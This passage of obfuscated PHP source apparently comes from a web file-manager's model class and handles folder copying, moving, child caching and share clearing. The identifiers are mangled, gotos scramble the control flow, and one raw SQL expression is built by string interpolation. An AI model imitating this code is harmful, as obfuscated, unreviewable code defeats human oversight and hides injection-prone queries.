REPEAT_SKIP) { } } } Hook::trigger($cª·‡…‰’È[502], array($cª·‡…‰’È[503], $dˆºãªÏ•¤, 0)); } goto BÊˆÍœÂç; BÊˆÍœÂç: return $b°ˆ‹‚å±; goto FŒ§’ìÉ‡É; FŒ§’ìÉ‡É: } private function _copyCreate($cÎËÒííÎó, $BµÅÒÅÓ‰, $d”Ë÷åŞÛš, &$aç¬‘‡ªÙ) { goto C‰Â×°šİ¬; f÷ƒ”Å: $this->addAll($cƒã“î¨…é, array(), !1); $b•§ÀÔµ = $this->where(array($E‹ê¢¢èç[457] => $Fé¾Ïİ—àİ))->select(); $eíãÊÄ…õ = $this->_childrenMakeRelation($eõ—‘Â­‰¸, $b•§ÀÔµ); goto E®À©§÷; C‰Â×°šİ¬: $E‹ê¢¢èç =& $_SERVER[Ö]; $b÷ì³…Å­— = $this->sourceInfoCache($cÎËÒííÎó); $f¿£ğœ˜²ˆ = $this->sourceInfoCache($BµÅÒÅÓ‰); goto E•¥ÈÎ·‘†; CÛÆø…¡‚Ø: foreach ($b•§ÀÔµ as $a©²«‡Ë) { $D™ŞƒŞì‰„ = $a©²«‡Ë[$E‹ê¢¢èç[365]]; $B—¼©”ß«¶ = $this->_childrenMatch($eíãÊÄ…õ, $a©²«‡Ë, $cöÁÄ‚ÖàÜ); $fñª¨Ğ×‹â[] = array($E‹ê¢¢èç[365], $D™ŞƒŞì‰„, $E‹ê¢¢èç[457], $B—¼©”ß«¶[$E‹ê¢¢èç[457]]); $C¶á…§É³×[] = array($E‹ê¢¢èç[365], $D™ŞƒŞì‰„, $E‹ê¢¢èç[455], $B—¼©”ß«¶[$E‹ê¢¢èç[455]]); $this->_copyApplyMeta($a©²«‡Ë, $aç¬‘‡ªÙ); if ($a©²«‡Ë[$E‹ê¢¢èç[366]] != $E‹ê¢¢èç[83]) { $aç¬‘‡ªÙ[$E‹ê¢¢èç[497]][] = $a©²«‡Ë[$E‹ê¢¢èç[415]]; } } $this->chunkEventSet($E‹ê¢¢èç[509], array($E‹ê¢¢èç[510], $Cæ»Éî¿ù¼, $EÌÇö¢Œ ›)); $this->saveAll($fñª¨Ğ×‹â); goto EˆÅ§¨¤À…; E®À©§÷: $eíãÊÄ…õ[$cÎËÒííÎó] = $Fé¾Ïİ—àİ; $fñª¨Ğ×‹â = array(); $C¶á…§É³× = array(); goto CÛÆø…¡‚Ø; dù«Ú—±§: $Fé¾Ïİ—àİ = $this->add($Cæ»Éî¿ù¼); $Bªæ¨¯ÎÜ» = array($E‹ê¢¢èç[365] => $Fé¾Ïİ—àİ, $E‹ê¢¢èç[28] => $d”Ë÷åŞÛš); $this->_copyApplyMeta($Bªæ¨¯ÎÜ», $aç¬‘‡ªÙ); goto CŒíÀ‰ÃÌ; CŒíÀ‰ÃÌ: if ($b÷ì³…Å­—[$E‹ê¢¢èç[366]] != $E‹ê¢¢èç[83]) { $aç¬‘‡ªÙ[$E‹ê¢¢èç[497]][] = $b÷ì³…Å­—[$E‹ê¢¢èç[415]]; return $Fé¾Ïİ—àİ; } $eõ—‘Â­‰¸ = array(); $cƒã“î¨…é = array(); goto c…¿Ñ®í¼; EˆÅ§¨¤À…: $this->chunkEventSet($E‹ê¢¢èç[511], array($E‹ê¢¢èç[512], $Cæ»Éî¿ù¼, $EÌÇö¢Œ ›)); $this->saveAll($C¶á…§É³×); return $Fé¾Ïİ—àİ; goto B†¥ñ×ÓŠ; c…¿Ñ®í¼: $this->_childrenListAll($cÎËÒííÎó, $eõ—‘Â­‰¸); $EÌÇö¢Œ › = count($eõ—‘Â­‰¸); if ($EÌÇö¢Œ › == 0) { return $Fé¾Ïİ—àİ; } goto Cà‘Û÷¹; Cà‘Û÷¹: $cöÁÄ‚ÖàÜ = $this->sourceInfo($Fé¾Ïİ—àİ); foreach ($eõ—‘Â­‰¸ as $a©²«‡Ë) { $AÔŒ¾š—² = $this->_makeItemData($a©²«‡Ë, $cöÁÄ‚ÖàÜ, $a©²«‡Ë[$E‹ê¢¢èç[28]]); $AÔŒ¾š—²[$E‹ê¢¢èç[455]] = $a©²«‡Ë[$E‹ê¢¢èç[455]]; $cƒã“î¨…é[] = $AÔŒ¾š—²; } $this->chunkEventSet($E‹ê¢¢èç[507], array($E‹ê¢¢èç[508], $Cæ»Éî¿ù¼, $EÌÇö¢Œ ›)); goto f÷ƒ”Å; E•¥ÈÎ·‘†: $Cæ»Éî¿ù¼ = $this->_makeItemData($b÷ì³…Å­—, $f¿£ğœ˜²ˆ, $d”Ë÷åŞÛš); Hook::trigger($E‹ê¢¢èç[504], $Cæ»Éî¿ù¼); Hook::trigger($E‹ê¢¢èç[505], array($E‹ê¢¢èç[506], $Cæ»Éî¿ù¼, 0)); goto dù«Ú—±§; B†¥ñ×ÓŠ: } private function _childrenMakeRelation($B±³‚¹õÅğ, $bç†¼Òˆº) { $EÛ”“´æ‘Ñ =& $_SERVER[Ö]; $aöâŠ‡áß´ = array(); $a„ŞÃ¼Íá° = array(); foreach ($B±³‚¹õÅğ as $fä¡¼µöæ) { $E¼ÛâÒÎ— = $fä¡¼µöæ[$EÛ”“´æ‘Ñ[28]] . $EÛ”“´æ‘Ñ[8] . $fä¡¼µöæ[$EÛ”“´æ‘Ñ[455]]; $aöâŠ‡áß´[$E¼ÛâÒÎ—] = $fä¡¼µöæ[$EÛ”“´æ‘Ñ[365]]; } foreach ($bç†¼Òˆº as $fä¡¼µöæ) { $E¼ÛâÒÎ— = $fä¡¼µöæ[$EÛ”“´æ‘Ñ[28]] . $EÛ”“´æ‘Ñ[8] . $fä¡¼µöæ[$EÛ”“´æ‘Ñ[455]]; $BÉî¢îÓõ³ = $aöâŠ‡áß´[$E¼ÛâÒÎ—]; $a„ŞÃ¼Íá°[$BÉî¢îÓõ³] = $fä¡¼µöæ[$EÛ”“´æ‘Ñ[365]]; } return $a„ŞÃ¼Íá°; } private function _childrenMatch($f—à³Ò «, $d“‘öç¼ê, $Câ×óÓÓö) { goto b“’•Ôàï; FƒÚ´ùò¾Š: foreach ($f…£‰Şˆá³ as $D¿ÆëŒŸŠÓ) { if (isset($f—à³Ò «[$D¿ÆëŒŸŠÓ])) { $BÆ–ÃÂ‰ƒÍ .= $f—à³Ò «[$D¿ÆëŒŸŠÓ] . $BÁÇÎÔ›Œ[513]; } } $BÆ–ÃÂ‰ƒÍ = rtrim($BÆ–ÃÂ‰ƒÍ, $BÁÇÎÔ›Œ[47]) . $BÁÇÎÔ›Œ[47]; $bÈ» ¿¿® = $this->parentLevelArray($BÆ–ÃÂ‰ƒÍ); goto B¯¼“‘–…¸; B¯¼“‘–…¸: $dÍÌ´ŒÈğŠ = $bÈ» ¿¿®[count($bÈ» ¿¿®) - 1]; return array($BÁÇÎÔ›Œ[457] => $dÍÌ´ŒÈğŠ, $BÁÇÎÔ›Œ[455] => $BÆ–ÃÂ‰ƒÍ); goto d‘È³‘Ö; b“’•Ôàï: $BÁÇÎÔ›Œ =& $_SERVER[Ö]; $BÆ–ÃÂ‰ƒÍ = $Câ×óÓÓö[$BÁÇÎÔ›Œ[455]]; $f…£‰Şˆá³ = $this->parentLevelArray($d“‘öç¼ê[$BÁÇÎÔ›Œ[455]]); goto FƒÚ´ùò¾Š; d‘È³‘Ö: } private function _makeItemData($Dİ‚Ç•ÛÛ£, $FŸ‡É¸–˜ù, $eƒŒƒ¡åŒÎ) { $e³ñÇ¦›Â =& $_SERVER[Ö]; $Aé‹–ŠÅÈÎ = array($e³ñÇ¦›Â[514] => $Dİ‚Ç•ÛÛ£[$e³ñÇ¦›Â[366]], $e³ñÇ¦›Â[382] => $eƒŒƒ¡åŒÎ, $e³ñÇ¦›Â[515] => $Dİ‚Ç•ÛÛ£[$e³ñÇ¦›Â[368]], $e³ñÇ¦›Â[416] => $Dİ‚Ç•ÛÛ£[$e³ñÇ¦›Â[415]], $e³ñÇ¦›Â[516] => $Dİ‚Ç•ÛÛ£[$e³ñÇ¦›Â[77]], $e³ñÇ¦›Â[517] => $FŸ‡É¸–˜ù[$e³ñÇ¦›Â[367]], $e³ñÇ¦›Â[518] => $FŸ‡É¸–˜ù[$e³ñÇ¦›Â[452]], $e³ñÇ¦›Â[519] => USER_ID, $e³ñÇ¦›Â[520] => USER_ID, $e³ñÇ¦›Â[364] => $FŸ‡É¸–˜ù[$e³ñÇ¦›Â[365]], $e³ñÇ¦›Â[521] => $FŸ‡É¸–˜ù[$e³ñÇ¦›Â[455]] . $FŸ‡É¸–˜ù[$e³ñÇ¦›Â[365]] . $e³ñÇ¦›Â[47], $e³ñÇ¦›Â[392] => 0, $e³ñÇ¦›Â[522] => $e³ñÇ¦›Â[33]); return $Aé‹–ŠÅÈÎ; } private function _copyApplyMeta($AÀÚÔ¬˜Ü‡, &$bøã×³äªÂ) { $Dòğ›Ğ­Áá =& $_SERVER[Ö]; $fö¦šµãøÙ = $AÀÚÔ¬˜Ü‡[$Dòğ›Ğ­Áá[365]]; $bğËôÊ•± = $AÀÚÔ¬˜Ü‡[$Dòğ›Ğ­Áá[28]]; if (!isset($AÀÚÔ¬˜Ü‡[$Dòğ›Ğ­Áá[523]]) || !$AÀÚÔ¬˜Ü‡[$Dòğ›Ğ­Áá[523]] || $AÀÚÔ¬˜Ü‡[$Dòğ›Ğ­Áá[523]] == $Dòğ›Ğ­Áá[464]) { $bøã×³äªÂ[$Dòğ›Ğ­Áá[499]][] = array($Dòğ›Ğ­Áá[365], $fö¦šµãøÙ, $Dòğ›Ğ­Áá[523], short_id($fö¦šµãøÙ)); } if (Input::check($bğËôÊ•±, $Dòğ›Ğ­Áá[524])) { $bøã×³äªÂ[$Dòğ›Ğ­Áá[498]][] = array($Dòğ›Ğ­Áá[365] => $fö¦šµãøÙ, $Dòğ›Ğ­Áá[89] => $Dòğ›Ğ­Áá[412], $Dòğ›Ğ­Áá[355] => str_replace($Dòğ›Ğ­Áá[50], $Dòğ›Ğ­Áá[33], Pinyin::encode($bğËôÊ•±))); $bøã×³äªÂ[$Dòğ›Ğ­Áá[498]][] = array($Dòğ›Ğ­Áá[365] => $fö¦šµãøÙ, $Dòğ›Ğ­Áá[89] => $Dòğ›Ğ­Áá[411], $Dòğ›Ğ­Áá[355] => Pinyin::encode($bğËôÊ•±, $Dòğ›Ğ­Áá[525])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($aè ¼¦Ô‘) { goto a”öµˆØ‘—; D©íŞí‹Òù: $Bõ’ŸÅ¬ÂÒ = array($Dš”äªğ„[455] => array($Dš”äªğ„[479], $C¹Çª’§[$Dš”äªğ„[455]] . $aè ¼¦Ô‘ . $Dš”äªğ„[480]), $Dš”äªğ„[393] => $this->targetIsDelete); $bæœÁ¦àØ = $this->field($DØä”¿¡)->where($Bõ’ŸÅ¬ÂÒ)->select(); if (!$bæœÁ¦àØ) { return; } goto f¹ÖÃì…ë; f¹ÖÃì…ë: $bæœÁ¦àØ = array_to_keyvalue($bæœÁ¦àØ, $Dš”äªğ„[365]); foreach ($bæœÁ¦àØ as $E´¨ê ‡ì‚) { $DªÛ¤­ÆƒÑ = $E´¨ê ‡ì‚[$Dš”äªğ„[457]]; $aè ¼¦Ô‘ = $E´¨ê ‡ì‚[$Dš”äªğ„[365]]; if (!isset($this->_childrenListCache[$aè ¼¦Ô‘]) && $E´¨ê ‡ì‚[$Dš”äªğ„[366]] == $Dš”äªğ„[83]) { $this->_childrenListCache[$aè ¼¦Ô‘] = array(); } if (!isset($this->_childrenListCache[$DªÛ¤­ÆƒÑ])) { $this->_childrenListCache[$DªÛ¤­ÆƒÑ] = array(); } $this->_childrenListCache[$DªÛ¤­ÆƒÑ][$aè ¼¦Ô‘] = $E´¨ê ‡ì‚; $this->_childrenItemCache[$aè ¼¦Ô‘] = $E´¨ê ‡ì‚; } goto c¾Œğ–ò³Œ; a”öµˆØ‘—: $Dš”äªğ„ =& $_SERVER[Ö]; $C¹Çª’§ = $this->sourceInfo($aè ¼¦Ô‘); $DØä”¿¡ = $Dš”äªğ„[526]; goto D©íŞí‹Òù; c¾Œğ–ò³Œ: } private function _childrenListAll($cõùê•ÇğŠ, &$EàçÅÅŒ¯¬) { $A­¯ †”§— =& $_SERVER[Ö]; if (!isset($this->_childrenListCache[$cõùê•ÇğŠ])) { return; } $aï‚‹ÌÚŠŒ = $this->_childrenListCache[$cõùê•ÇğŠ]; foreach ($aï‚‹ÌÚŠŒ as $A‘ ’ƒÛ¤ä => $B‚ÍÍš²…) { $EàçÅÅŒ¯¬[$A‘ ’ƒÛ¤ä] = $B‚ÍÍš²…; if ($B‚ÍÍš²…[$A­¯ †”§—[366]] == $A­¯ †”§—[83]) { $this->_childrenListAll($A‘ ’ƒÛ¤ä, $EàçÅÅŒ¯¬); } } } private function sourceInfoCache($d‘œÔËé´ë) { if (isset($this->_childrenItemCache[$d‘œÔËé´ë])) { return $this->_childrenItemCache[$d‘œÔËé´ë]; } return $this->sourceInfo($d‘œÔËé´ë); } private function _childrenList($DŒ„ğùíğÍ) { if (isset($this->_childrenListCache[$DŒ„ğùíğÍ])) { return $this->_childrenListCache[$DŒ„ğùíğÍ]; } return $this->_childrenListSelect($DŒ„ğùíğÍ); } private function _childrenListSelect($eã¥‡‹ä‹á) { goto aÅĞ—æ¨; D‡Ù–šÎã: $Cöêô«è¯Ö = $Cöêô«è¯Ö ? $Cöêô«è¯Ö : array(); $e–…„ºó—· = array_to_keyvalue($Cöêô«è¯Ö, $A³òÂ±Ë›¥[365]); $this->_childrenListCache[$eã¥‡‹ä‹á] = $e–…„ºó—·; goto a‹‚é–Æè¶; aÅĞ—æ¨: $A³òÂ±Ë›¥ =& $_SERVER[Ö]; $bÈéáâ¢¼† = array($A³òÂ±Ë›¥[457] => $eã¥‡‹ä‹á, $A³òÂ±Ë›¥[393] => $this->targetIsDelete); $Cöêô«è¯Ö = $this->where($bÈéáâ¢¼†)->select(); goto D‡Ù–šÎã; a‹‚é–Æè¶: foreach ($e–…„ºó—· as $eã¥‡‹ä‹á => $A¡çŠšë¬ƒ) { $this->_childrenItemCache[$eã¥‡‹ä‹á] = $A¡çŠšë¬ƒ; } return $e–…„ºó—·; goto Ešº°±°¢§; Ešº°±°¢§: } private function fileNameExistCache($eÛ»œ©÷ø, $AÑŠÁŞµœ†) { $aÅÙÓáÓƒÎ =& $_SERVER[Ö]; $AÑŠÁŞµœ† = strtolower($AÑŠÁŞµœ†); $b‹ƒƒ¤¢’„ = $this->_childrenList($eÛ»œ©÷ø); foreach ($b‹ƒƒ¤¢’„ as $D¼‹Ì“ß®¼) { if ($AÑŠÁŞµœ† == strtolower($D¼‹Ì“ß®¼[$aÅÙÓáÓƒÎ[28]])) { return $D¼‹Ì“ß®¼[$aÅÙÓáÓƒÎ[365]]; } } return !1; } private function fileNameAutoCache($eæ¨‚ÌÜŒ”, $eˆˆª›ŒÒ, $dğ®Ä¿ÓÏ¯, $b¼»éâ¾†¡) { $F±Åå”½ˆİ =& $_SERVER[Ö]; $aª¦¦ÈïŠ = $this->_childrenList($eæ¨‚ÌÜŒ”); $A½¤ ªÎò¯ = array_to_keyvalue($aª¦¦ÈïŠ, $F±Åå”½ˆİ[33], $F±Åå”½ˆİ[28]); return $this->fileNameAutoGet($A½¤ ªÎò¯, $eˆˆª›ŒÒ, $dğ®Ä¿ÓÏ¯, $b¼»éâ¾†¡); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($DŞ èù‡Æ¡, $A””¼–°¢µ, $f¸÷çÆõøÁ = REPEAT_REPLACE, $E‰®öö”·Ü = '') { goto FÑ¡ÒôÛ¥è; C ºŸ¨ÎÚ: $B¾§¹­‹Å = $this->pathInfoMore($DŞ èù‡Æ¡); if ($this->isParentOf($DŞ èù‡Æ¡, $A””¼–°¢µ)) { return !1; } if (!$F«¦’’³ïñ || !$Cöˆ±İÈÔ || $Cöˆ±İÈÔ[$Dœàê²Á·Ÿ[366]] != $Dœàê²Á·Ÿ[83]) { return !1; } goto CÈ¼Âá‡; CÀ ”´‰Îö: Model($Dœàê²Á·Ÿ[501])->eventMove($DŞ èù‡Æ¡, $F«¦’’³ïñ[$Dœàê²Á·Ÿ[457]], $A””¼–°¢µ); Hook::trigger($Dœàê²Á·Ÿ[528], $B¾§¹­‹Å); return $D·ìÏïãíÛ; goto cÁÀî¢‡ñÆ; FÑ¡ÒôÛ¥è: $Dœàê²Á·Ÿ =& $_SERVER[Ö]; $F«¦’’³ïñ = $this->sourceInfo($DŞ èù‡Æ¡); $Cöˆ±İÈÔ = $this->sourceInfo($A””¼–°¢µ); goto C ºŸ¨ÎÚ; D¥®¤½¹¼º: Model($Dœàê²Á·Ÿ[163])->linkAdd($Dõ•ƒã‚ç[$Dœàê²Á·Ÿ[497]]); if ($A¨…Å‹Úœó && $Dõ•ƒã‚ç[$Dœàê²Á·Ÿ[529]]) { $this->removeNow($DŞ èù‡Æ¡, !1); } $this->lockMoveEnd($DŞ èù‡Æ¡); goto B”±†‰Ôãˆ; CÈ¼Âá‡: Hook::trigger($Dœàê²Á·Ÿ[527], $B¾§¹­‹Å); $this->targetIsDelete = intval($F«¦’’³ïñ[$Dœàê²Á·Ÿ[393]]); if ($F«¦’’³ïñ[$Dœàê²Á·Ÿ[457]] == $A””¼–°¢µ && $E‰®öö”·Ü != $F«¦’’³ïñ[$Dœàê²Á·Ÿ[28]]) { $FÂš¡¬Å¨ì = $this->fileNameExist($A””¼–°¢µ, $E‰®öö”·Ü); if ($FÂš¡¬Å¨ì && $F«¦’’³ïñ[$Dœàê²Á·Ÿ[366]] == $Dœàê²Á·Ÿ[464]) { goto FØ£“±¤Í; a¨ óóœÈ’: $this->removeNow($DŞ èù‡Æ¡, !1); $this->folderSizeReset($A””¼–°¢µ); Hook::trigger($Dœàê²Á·Ÿ[528], $B¾§¹­‹Å); goto A‚öë­‰Ï; A‚öë­‰Ï: return $FÂš¡¬Å¨ì; goto d©ñÉ´‚Ôî; FØ£“±¤Í: $A¥î°›Áˆ£ = $this->sourceInfo($FÂš¡¬Å¨ì); $CØÎÎºäÀ¼ = $this->fileHistory($A¥î°›Áˆ£, $F«¦’’³ïñ[$Dœàê²Á·Ÿ[415]], $F«¦’’³ïñ[$Dœàê²Á·Ÿ[77]]); if (!$CØÎÎºäÀ¼) { Model($Dœàê²Á·Ÿ[418])->remove($F«¦’’³ïñ[$Dœàê²Á·Ÿ[415]]); } goto a¨ óóœÈ’; d©ñÉ´‚Ôî: } } goto BÆã©Ãõ·ñ; e¼ö††¥“¨: $Dõ•ƒã‚ç = array($Dœàê²Á·Ÿ[497] => array(), $Dœàê²Á·Ÿ[529] => !1); $this->clearShare($DŞ èù‡Æ¡, $A””¼–°¢µ); $A¨…Å‹Úœó = $this->fileNameExistCache($A””¼–°¢µ, $F«¦’’³ïñ[$Dœàê²Á·Ÿ[28]]); goto C³ÉÍò»˜; B”±†‰Ôãˆ: $this->lockWriteEnd($A””¼–°¢µ, $cà¤‹‰Ö©š); $this->folderSizeReset($F«¦’’³ïñ[$Dœàê²Á·Ÿ[457]]); $this->folderSizeReset($A””¼–°¢µ); goto fé§ˆéˆØ; C³ÉÍò»˜: $D·ìÏïãíÛ = $this->_move($DŞ èù‡Æ¡, $A””¼–°¢µ, $f¸÷çÆõøÁ, $Dõ•ƒã‚ç, $E‰®öö”·Ü); $this->sourceCacheClear(); if ($F«¦’’³ïñ[$Dœàê²Á·Ÿ[366]] == $Dœàê²Á·Ÿ[83] && $A¨…Å‹Úœó) { $this->folderSizeResetChildren($D·ìÏïãíÛ); } goto D¥®¤½¹¼º; BÆã©Ãõ·ñ: $cà¤‹‰Ö©š = $E‰®öö”·Ü ? $E‰®öö”·Ü : $F«¦’’³ïñ[$Dœàê²Á·Ÿ[28]]; $this->lockMoveStart($DŞ èù‡Æ¡); $this->lockWriteStart($A””¼–°¢µ, $cà¤‹‰Ö©š); goto e¼ö††¥“¨; fé§ˆéˆØ: $bÛÀš‰…¼ë = array($F«¦’’³ïñ[$Dœàê²Á·Ÿ[457]], $A””¼–°¢µ); if ($F«¦’’³ïñ[$Dœàê²Á·Ÿ[366]] == $Dœàê²Á·Ÿ[83]) { $bÛÀš‰…¼ë[] = $DŞ èù‡Æ¡; } $this->updateModifyTime($bÛÀš‰…¼ë); goto CÀ ”´‰Îö; cÁÀî¢‡ñÆ: } private function _move($fëÖ´öçÖµ, $CöŠ­İ…ğ, $cö“ÇĞñœ, &$aø»çÇäÀ, $AÒ‚ÛÑ«š˜ = '') { goto B¿Î¼™ƒÑÚ; f°Ò•‹¦ç«: $this->lockWriteStart($CöŠ­İ…ğ, $CÑï÷âçÃ); if (!$aÚç×‰„©) { return $this->_moveForce($fëÖ´öçÖµ, $CöŠ­İ…ğ, $CÑï÷âçÃ); } $f«–ÆÁñ = $aÚç×‰„©; goto bâÉªíµÊ¯; eğ§‘äµÅ„: $CÑï÷âçÃ = $AÒ‚ÛÑ«š˜ ? $AÒ‚ÛÑ«š˜ : $E™á¢ÄÌÈ·[$c±º¦îÛã™[28]]; $aÚç×‰„© = $this->fileNameExistCache($CöŠ­İ…ğ, $CÑï÷âçÃ); $this->lockMoveStart($fëÖ´öçÖµ); goto f°Ò•‹¦ç«; A’¥ğå¹¹…: return $f«–ÆÁñ; goto Bœ„„ŸŠ„‘; B¿Î¼™ƒÑÚ: $c±º¦îÛã™ =& $_SERVER[Ö]; $E™á¢ÄÌÈ· = $this->sourceInfo($fëÖ´öçÖµ); $dÚ­„Šï = $E™á¢ÄÌÈ·[$c±º¦îÛã™[366]] == $c±º¦îÛã™[83]; goto eğ§‘äµÅ„; bâÉªíµÊ¯: $FÃ¥ßÇØ£† = !1; if ($dÚ­„Šï) { if ($cö“ÇĞñœ == REPEAT_RENAME_FOLDER) { $CÑï÷âçÃ = $this->fileNameAuto($CöŠ­İ…ğ, $CÑï÷âçÃ, $cö“ÇĞñœ, $dÚ­„Šï); $f«–ÆÁñ = $this->_moveForce($fëÖ´öçÖµ, $CöŠ­İ…ğ, $CÑï÷âçÃ); } else { if ($cö“ÇĞñœ == REPEAT_RENAME_FOLDER) { $cö“ÇĞñœ = REPEAT_RENAME; } $cÙ…•…—Æ» = $this->_childrenListSelect($fëÖ´öçÖµ); foreach ($cÙ…•…—Æ» as $aÜ…ç¯Ğ) { $this->_move($aÜ…ç¯Ğ[$c±º¦îÛã™[365]], $aÚç×‰„©, $cö“ÇĞñœ, $aø»çÇäÀ); } $FÃ¥ßÇØ£† = !0; } } else { if ($cö“ÇĞñœ == REPEAT_SKIP) { $FÃ¥ßÇØ£† = !0; } else { if ($cö“ÇĞñœ == REPEAT_RENAME || $cö“ÇĞñœ == REPEAT_RENAME_FOLDER) { $CÑï÷âçÃ = $this->fileNameAuto($CöŠ­İ…ğ, $CÑï÷âçÃ, $cö“ÇĞñœ, $dÚ­„Šï); $f«–ÆÁñ = $this->_moveForce($fëÖ´öçÖµ, $CöŠ­İ…ğ, $CÑï÷âçÃ); } else { if ($cö“ÇĞñœ == REPEAT_REPLACE) { $AÒ‘î„Œª¥ = $this->sourceInfoCache($aÚç×‰„©); $eÇ«˜¿¬õ = $this->fileHistory($AÒ‘î„Œª¥, $E™á¢ÄÌÈ·[$c±º¦îÛã™[415]], $E™á¢ÄÌÈ·[$c±º¦îÛã™[77]]); if ($eÇ«˜¿¬õ) { $aø»çÇäÀ[$c±º¦îÛã™[497]][] = $E™á¢ÄÌÈ·[$c±º¦îÛã™[415]]; } else { $FÃ¥ßÇØ£† = !0; } } } } } if ($FÃ¥ßÇØ£† && !$aø»çÇäÀ[$c±º¦îÛã™[529]]) { $aø»çÇäÀ[$c±º¦îÛã™[529]] = !0; } goto A’¥ğå¹¹…; Bœ„„ŸŠ„‘: } private function _moveForce($D«Â„Ş©ß‚, $a´ÇØ‘æ²â, $DĞá©ºß¥) { goto dÈ´¦Î¶°Ü; Eè÷„¦·ÍÏ: if ($F×¥òƒÒ×¤) { $EºšÕÕëÑÜ = array($C‹ËÛ×Û¿[521] => array($C‹ËÛ×Û¿[479], $aêŠ´ÅèÁµ[$C‹ËÛ×Û¿[455]] . $aêŠ´ÅèÁµ[$C‹ËÛ×Û¿[365]] . $C‹ËÛ×Û¿[480])); $CŞ„ª„·µÂ = $aêŠ´ÅèÁµ[$C‹ËÛ×Û¿[455]] . $aêŠ´ÅèÁµ[$C‹ËÛ×Û¿[365]] . $C‹ËÛ×Û¿[47]; $DÔè±¼Òò = $D¬¶éàÇ°—[$C‹ËÛ×Û¿[455]] . $D¬¶éàÇ°—[$C‹ËÛ×Û¿[365]] . $C‹ËÛ×Û¿[47] . $aêŠ´ÅèÁµ[$C‹ËÛ×Û¿[365]] . $C‹ËÛ×Û¿[47]; $Eä¤‘“ÒÑå = array($C‹ËÛ×Û¿[521] => array($C‹ËÛ×Û¿[530], "\162\145\160\x6c\x61\x63\x65\50\x70\141\162\x65\x6e\164\x4c\145\166\x65\154\x2c\x27{$CŞ„ª„·µÂ}\47\x2c\x27{$DÔè±¼Òò}\47\51"), $C‹ËÛ×Û¿[517] => $D¬¶éàÇ°—[$C‹ËÛ×Û¿[367]], $C‹ËÛ×Û¿[518] => $D¬¶éàÇ°—[$C‹ËÛ×Û¿[452]]); if ($C£¼Ü”³ãÚ) { $Eä¤‘“ÒÑå[$C‹ËÛ×Û¿[392]] = 0; } $this->where($EºšÕÕëÑÜ)->data($Eä¤‘“ÒÑå)->save(); } $this->where(array($C‹ËÛ×Û¿[379] => $D«Â„Ş©ß‚))->data($dÔ›“‹Ì£)->save(); return $D«Â„Ş©ß‚; goto F±è…‚¤ğ; dÈ´¦Î¶°Ü: $C‹ËÛ×Û¿ =& $_SERVER[Ö]; $aêŠ´ÅèÁµ = $this->sourceInfo($D«Â„Ş©ß‚); $D¬¶éàÇ°— = $this->sourceInfo($a´ÇØ‘æ²â); goto D–¢Ğ«¥ÍŠ; D–¢Ğ«¥ÍŠ: $F×¥òƒÒ×¤ = $aêŠ´ÅèÁµ[$C‹ËÛ×Û¿[366]] == $C‹ËÛ×Û¿[83]; $dÔ›“‹Ì£ = array($C‹ËÛ×Û¿[364] => $D¬¶éàÇ°—[$C‹ËÛ×Û¿[365]], $C‹ËÛ×Û¿[521] => $D¬¶éàÇ°—[$C‹ËÛ×Û¿[455]] . $D¬¶éàÇ°—[$C‹ËÛ×Û¿[365]] . $C‹ËÛ×Û¿[47], $C‹ËÛ×Û¿[517] => $D¬¶éàÇ°—[$C‹ËÛ×Û¿[367]], $C‹ËÛ×Û¿[518] => $D¬¶éàÇ°—[$C‹ËÛ×Û¿[452]], $C‹ËÛ×Û¿[520] => USER_ID, $C‹ËÛ×Û¿[382] => $DĞá©ºß¥); $a¢­‚õÅÅÆ = $aêŠ´ÅèÁµ[$C‹ËÛ×Û¿[367]] == SourceModel::TYPE_GROUP && $D¬¶éàÇ°—[$C‹ËÛ×Û¿[367]] == SourceModel::TYPE_GROUP && $aêŠ´ÅèÁµ[$C‹ËÛ×Û¿[452]] == $D¬¶éàÇ°—[$C‹ËÛ×Û¿[452]]; goto B†ÆÆŒÀ³; B†ÆÆŒÀ³: if (!$a¢­‚õÅÅÆ) { Model($C‹ËÛ×Û¿[450])->authClear($D«Â„Ş©ß‚); } $C£¼Ü”³ãÚ = $aêŠ´ÅèÁµ[$C‹ËÛ×Û¿[393]] == $C‹ËÛ×Û¿[83] && $D¬¶éàÇ°—[$C‹ËÛ×Û¿[393]] != $C‹ËÛ×Û¿[83]; if ($C£¼Ü”³ãÚ) { $dÔ›“‹Ì£[$C‹ËÛ×Û¿[392]] = 0; } goto Eè÷„¦·ÍÏ; F±è…‚¤ğ: } private function clearShare($fÈÖ´¤½ŸÊ, $c§¦™ÏŞêø) { goto a²ó¦ê²»ï; E¬š¦…ˆòÈ: if (!$EŠ´’Š¶ƒ„) { return; } $cÎÅÁ¶£ÁÈ = array($fÆ»½Õš±‰[365] => array($fÆ»½Õš±‰[7], $EŠ´’Š¶ƒ„), $fÆ»½Õš±‰[444] => 1); $EäĞÜ­ó = Model($fÆ»½Õš±‰[532])->field($fÆ»½Õš±‰[437])->where($cÎÅÁ¶£ÁÈ)->select(); goto c±„•ÑÑ§á; a²ó¦ê²»ï: $fÆ»½Õš±‰ =& $_SERVER[Ö]; $bí‚ß©ÕŸß = $this->sourceInfo($fÈÖ´¤½ŸÊ); $E„…‚¿µ¡š = $this->sourceInfo($c§¦™ÏŞêø); goto CÀò‰Ä¡; c±„•ÑÑ§á: if (!$EäĞÜ­ó) { return; } $EäĞÜ­ó = array_to_keyvalue($EäĞÜ­ó, $fÆ»½Õš±‰[33], $fÆ»½Õš±‰[437]); $cÎÅÁ¶£ÁÈ = array($fÆ»½Õš±‰[437] => array($fÆ»½Õš±‰[7], $EäĞÜ­ó)); goto BŠ»Ê¹‚Î˜; CÀò‰Ä¡: if ($bí‚ß©ÕŸß[$fÆ»½Õš±‰[452]] == $E„…‚¿µ¡š[$fÆ»½Õš±‰[452]] && $bí‚ß©ÕŸß[$fÆ»½Õš±‰[367]] == $fÆ»½Õš±‰[531]) { return; } $cÎÅÁ¶£ÁÈ = array($fÆ»½Õš±‰[455] => array($fÆ»½Õš±‰[479], $bí‚ß©ÕŸß[$fÆ»½Õš±‰[455]] . $fÈÖ´¤½ŸÊ . $fÆ»½Õš±‰[480])); $EŠ´’Š¶ƒ„ = $this->field($fÆ»½Õš±‰[379])->where($cÎÅÁ¶£ÁÈ)->getField($fÆ»½Õš±‰[365], !0); goto E¬š¦…ˆòÈ; BŠ»Ê¹‚Î˜: Model($fÆ»½Õš±‰[532])->where($cÎÅÁ¶£ÁÈ)->save(array($fÆ»½Õš±‰[444] => 0)); 